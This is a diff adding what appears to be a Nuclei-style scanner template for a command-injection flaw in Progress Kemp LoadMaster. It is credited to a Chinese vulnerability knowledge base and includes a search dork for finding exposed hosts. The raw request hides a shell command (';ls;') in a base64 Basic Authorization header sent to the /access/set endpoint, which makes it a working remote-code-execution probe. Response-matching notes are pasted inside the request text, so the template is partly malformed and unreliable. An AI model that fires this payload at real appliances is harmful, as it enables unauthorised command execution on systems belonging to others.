@@ -1,0 +1,49 @@
+id: poc-payrvdpbdpqcpu85
+info:
+  name: Progress Kemp LoadMaster 命令注入漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/payrvdpbdpqcpu85'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: payrvdpbdpqcpu85
+    fofa: shodan：html:"LoadMaster"
+http:
+- raw:
+  - 'GET /access/set?param=enableapi&value=1 HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Authorization: Basic JztsczsnOmRvZXNub3RtYXR0ZXI=
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?etc)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
